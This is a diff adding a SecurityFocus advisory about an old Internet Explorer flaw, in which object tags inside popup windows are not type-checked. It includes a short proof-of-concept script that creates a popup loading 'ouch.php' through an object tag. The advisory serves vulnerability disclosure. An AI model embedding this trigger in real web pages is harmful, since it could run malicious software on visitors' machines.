@@ -1,0 +1,16 @@
+source: http://www.securityfocus.com/bid/8556/info
+
+Internet Explorer does not properly handle object types, when rendering malicious popup windows. This may result in the possibility of the execution of malicious software.
+
+The problem occurs when Internet Explorer receives a response from the server when a malicious popup window containing an object tag is parsed. Proper parameter checks of the type of file being loaded are not performed on the object type contained within HTTP response received from the web server.
+
+<script>
+var oPopup = window.createPopup();
+
+function showPopup() {
+oPopup.document.body.innerHTML = "<object data=ouch.php>";
+oPopup.show(0,0,1,1,document.body);
+}
+
+showPopup()
+</script>
